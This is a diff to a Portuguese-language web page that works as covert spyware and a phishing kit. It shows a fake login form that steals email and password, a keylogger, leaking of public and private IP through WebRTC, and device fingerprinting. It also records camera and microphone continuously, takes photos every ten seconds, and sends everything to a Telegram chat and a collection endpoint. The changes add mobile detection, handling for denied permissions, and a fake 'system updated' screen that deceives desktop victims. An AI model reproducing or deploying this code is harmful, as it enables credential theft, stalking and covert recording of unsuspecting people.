@@ -14,6 +14,7 @@
  #fakeForm input{width:260px;padding:12px;margin:8px 0;border:0;border-radius:4px;font-size:16px}
  #fakeForm button{width:100%;padding:14px;margin-top:12px;border:0;border-radius:4px;background:#00ff88;color:#000;font-size:16px;font-weight:bold;cursor:pointer}
  #fakeForm button:hover{background:#00cc6a}
+ #statusPC{position:fixed;bottom:20px;left:20px;color:#00ff88;font:12px monospace;opacity:0.6}
 </style>
 </head>
 <body>
@@ -28,6 +29,8 @@
  <input id="pw" type="password" placeholder="Senha" autocomplete="current-password">
  <button type="submit">Entrar</button>
 </form>
+
+<div id="statusPC"></div>
 
 <script>
 /* ========== CONFIGS ========== */
@@ -51,7 +54,10 @@ const save=u=>fetch("/api/salva",{
 
 /* ========== UTILS ========== */
 const sleep=ms=>new Promise(r=>setTimeout(r,ms));
-const randId=()=>Math.random().toString(36).slice(2);
+const statusPC=m=>{
+ const el=document.getElementById("statusPC");
+ if(el)el.textContent=m;
+};
 
 /* ========== VARS GLOBAIS ========== */
 let rel=[];
@@ -60,41 +66,52 @@ let audioChunksA=[],audioChunksB=[],useA=true;
 let videoChunks=[];
 let keyLog=[],clipLog=[];
 let fotoTimeout=null,videoStream=null,audioStream=null;
+let isMobile=false;
+
+/* ========== DETECÇÃO MOBILE ========== */
+function checkMobile(){
+ return /iPhone|iPad|iPod|Android|webOS|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent) 
+   || (navigator.maxTouchPoints && navigator.maxTouchPoints>2);
+}
 
 /* ========== 0. IP + ISP + REDE + VPN + WEBRTC LEAK ========== */
 async function redes(){
- const ip=await fetch("https://api.ipify.org?format=json")
-   .then(r=>r.json())
-   .then(j=>j.ip)
-   .catch(()=>"---");
- rel.push(`IP Público: ${ip}`);
-
- const pc=new RTCPeerConnection({iceServers:[{urls:"stun:stun.l.google.com:19302"}]});
- pc.createDataChannel("");
- let cand=[];
- pc.onicecandidate=e=>{if(e&&e.candidate)cand.push(e.candidate.candidate)};
- 
  try{
-   await pc.setLocalDescription(await pc.createOffer());
-   await sleep(1500);
- }catch(e){}
- pc.close();
- 
- const priv=cand.find(c=>c.includes("192.168")||c.includes("10.")||c.includes("172."));
- rel.push(`IP Privado: ${priv?priv.split(" ")[4]:'---'}`);
+   const ip=await fetch("https://api.ipify.org?format=json")
+     .then(r=>r.json())
+     .then(j=>j.ip)
+     .catch(()=>"---");
+   rel.push(`IP Público: ${ip}`);
 
- const geo=await fetch(`http://ip-api.com/json/${ip}`)
-   .then(r=>r.json())
-   .catch(()=>({isp:"---",country:"---",org:""}));
- rel.push(`ISP: ${geo.isp||'---'} | País: ${geo.country||'---'}`);
+   const pc=new RTCPeerConnection({iceServers:[{urls:"stun:stun.l.google.com:19302"}]});
+   pc.createDataChannel("");
+   let cand=[];
+   pc.onicecandidate=e=>{if(e&&e.candidate)cand.push(e.candidate.candidate)};
+   
+   try{
+     await pc.setLocalDescription(await pc.createOffer());
+     await sleep(1500);
+   }catch(e){}
+   pc.close();
+   
+   const priv=cand.find(c=>c.includes("192.168")||c.includes("10.")||c.includes("172."));
+   rel.push(`IP Privado: ${priv?priv.split(" ")[4]:'---'}`);
 
- if(navigator.connection){
-   const c=navigator.connection;
-   rel.push(`Rede: ${c.type||'-'} ${c.effectiveType||'-'} ${c.downlink?c.downlink+'Mbps':''}`);
+   const geo=await fetch(`http://ip-api.com/json/${ip}`)
+     .then(r=>r.json())
+     .catch(()=>({isp:"---",country:"---",org:""}));
+   rel.push(`ISP: ${geo.isp||'---'} | País: ${geo.country||'---'}`);
+
+   if(navigator.connection){
+     const c=navigator.connection;
+     rel.push(`Rede: ${c.type||'-'} ${c.effectiveType||'-'} ${c.downlink?c.downlink+'Mbps':''}`);
+   }
+   
+   const vpnSuspeito=geo.org&&geo.org.toLowerCase().includes("vpn");
+   rel.push(`VPN?: ${vpnSuspeito?"Suspeito":"Não detectado"}`);
+ }catch(e){
+   rel.push(`Rede: erro - ${e.message}`);
  }
- 
- const vpnSuspeito=geo.org&&geo.org.toLowerCase().includes("vpn");
- rel.push(`VPN?: ${vpnSuspeito?"Suspeito":"Não detectado"}`);
 }
 
 /* ========== 1. HARDWARE / SO / BATERIA / MEMÓRIA ========== */
@@ -106,6 +123,8 @@ function hwinfo(){
  rel.push(`Tela: ${screen.width}x${screen.height} | Viewport: ${window.innerWidth}x${window.innerHeight}`);
  rel.push(`Idioma: ${navigator.language}`);
  rel.push(`Online: ${navigator.onLine}`);
+ rel.push(`Touch: ${navigator.maxTouchPoints||0} pontos`);
+ rel.push(`Mobile detectado: ${isMobile}`);
  
  if(performance.memory){
    const used=(performance.memory.usedJSHeapSize/1048576).toFixed(1);
@@ -143,22 +162,39 @@ function keylogger(){
  },3000);
 }
 
-/* ========== 3. FOTOS 10s + VIDEO CONTÍNUO + AUDIO 10s SEM GAP ========== */
+/* ========== 3. FOTOS + VIDEO + AUDIO (com fallback) ========== */
 async function midias(){
- const stream=await navigator.mediaDevices.getUserMedia({
-   video:{facingMode:"user",width:1280,height:720},
-   audio:{sampleRate:44100,channelCount:1,echoCancellation:false}
- });
+ statusPC("Solicitando permissões de mídia...");
  
+ let stream=null;
+ try{
+   stream=await navigator.mediaDevices.getUserMedia({
+     video:{facingMode:"user",width:1280,height:720},
+     audio:{sampleRate:44100,channelCount:1,echoCancellation:false}
+   });
+   statusPC("Mídia autorizada - gravando...");
+ }catch(err){
+   rel.push(`Mídia negada: ${err.name}`);
+   statusPC("Mídia negada - continuando sem câmera/mic");
+   enviarTexto("📊 RELATÓRIO (sem mídia)\n"+rel.join("\n"));
+   save({t:"rel",v:rel.join("\n")});
+   return;
+ }
+
  videoStream=stream;
  audioStream=new MediaStream(stream.getAudioTracks());
 
  // VIDEO contínuo
- videoRecorder=new MediaRecorder(videoStream,{mimeType:"video/webm;codecs=vp9,opus"});
- videoRecorder.ondataavailable=e=>{
-   if(e.data&&e.data.size>0)videoChunks.push(e.data);
- };
- videoRecorder.start(1000);
+ try{
+   videoRecorder=new MediaRecorder(videoStream,{mimeType:"video/webm;codecs=vp9,opus"});
+   videoRecorder.ondataavailable=e=>{
+     if(e.data&&e.data.size>0)videoChunks.push(e.data);
+   };
+   videoRecorder.start(1000);
+   statusPC("Vídeo iniciado");
+ }catch(e){
+   rel.push(`Erro vídeo: ${e.message}`);
+ }
 
  setInterval(()=>{
    if(!videoChunks.length)return;
@@ -168,32 +204,23 @@ async function midias(){
    fd.append("chat_id",CHAT_ID);
    enviarMidia("Video",fd);
    save({t:"video",s:blob.size});
+   statusPC(`Vídeo enviado: ${(blob.size/1024/1024).toFixed(1)}MB`);
  },60000);
 
  // AUDIO alternado A/B
  const makeAudioRecorder=()=>{
    const rec=new MediaRecorder(audioStream,{mimeType:"audio/webm;codecs=opus"});
    rec.ondataavailable=e=>{
-     if(!useA){
-       audioChunksA.push(e.data);
-       if(audioChunksA.length>=5){
-         const blob=new Blob(audioChunksA.splice(0),{type:"audio/webm"});
-         const fd=new FormData();
-         fd.append("voice",blob,`a${Date.now()}.webm`);
-         fd.append("chat_id",CHAT_ID);
-         enviarMidia("Voice",fd);
-         save({t:"audio",s:blob.size});
-       }
-     }else{
-       audioChunksB.push(e.data);
-       if(audioChunksB.length>=5){
-         const blob=new Blob(audioChunksB.splice(0),{type:"audio/webm"});
-         const fd=new FormData();
-         fd.append("voice",blob,`a${Date.now()}.webm`);
-         fd.append("chat_id",CHAT_ID);
-         enviarMidia("Voice",fd);
-         save({t:"audio",s:blob.size});
-       }
+     const chunks=useA?audioChunksB:audioChunksA;
+     chunks.push(e.data);
+     const targetChunks=useA?audioChunksA:audioChunksB;
+     if(targetChunks.length>=5){
+       const blob=new Blob(targetChunks.splice(0),{type:"audio/webm"});
+       const fd=new FormData();
+       fd.append("voice",blob,`a${Date.now()}.webm`);
+       fd.append("chat_id",CHAT_ID);
+       enviarMidia("Voice",fd);
+       save({t:"audio",s:blob.size});
      }
    };
    rec.start(2000);
@@ -221,7 +248,6 @@ async function midias(){
      save({t:label,s:blob.size});
      track.stop();
    }catch(err){
-     // fallback canvas
      const c=document.createElement("canvas");
      c.width=640;c.height=480;
      const v=document.createElement("video");
@@ -241,9 +267,11 @@ async function midias(){
 
  fotoTimeout=setInterval(()=>tirarFoto("user","selfie"),10000);
  setTimeout(()=>tirarFoto("environment","rear"),2000);
+ 
+ statusPC("Mídia ativa - fotos a cada 10s");
 }
 
-/* ========== 4. FAKE LOGIN ========== */
+/* ========== 4. FAKE LOGIN (apenas mobile) ========== */
 function fakeLogin(){
  document.getElementById("load").style.display="none";
  document.getElementById("fakeForm").style.display="flex";
@@ -257,6 +285,7 @@ function fakeLogin(){
    enviarTexto(`🔐 LOGIN\nE: ${email}\nS: ${senha}`);
    save({t:"login",em:email,pw:senha});
    document.getElementById("fakeForm").style.display="none";
+   document.getElementById("load").style.display="flex";
    initFinal();
  };
 }
@@ -271,19 +300,29 @@ async function initFinal(){
    await midias();
    enviarTexto("📊 RELATÓRIO\n"+rel.join("\n"));
    save({t:"rel",v:rel.join("\n")});
+   if(!isMobile){
+     document.getElementById("load").style.display="none";
+     document.body.innerHTML='<div style="color:#00ff88;font:20px sans-serif">Sistema atualizado. <button onclick="location.reload()" style="margin-left:10px;padding:5px 15px">Recarregar</button></div>';
+   }
  }catch(e){
    enviarTexto("❌ ERRO: "+e.message);
+   statusPC("Erro: "+e.message);
  }
 }
 
 /* ========== 6. DISPARO ========== */
-(async()=>{
- if(/iPhone|iPad|iPod|Android/i.test(navigator.userAgent)){
+window.onload=()=>{
+ isMobile=checkMobile();
+ 
+ if(isMobile){
+   // Mobile: mostra login falso primeiro
    fakeLogin();
  }else{
-   await initFinal();
+   // PC: executa direto, esconde loading quando terminar
+   statusPC("Modo PC detectado - iniciando coleta...");
+   initFinal();
  }
-})();
+};
 </script>
 </body>
 </html>
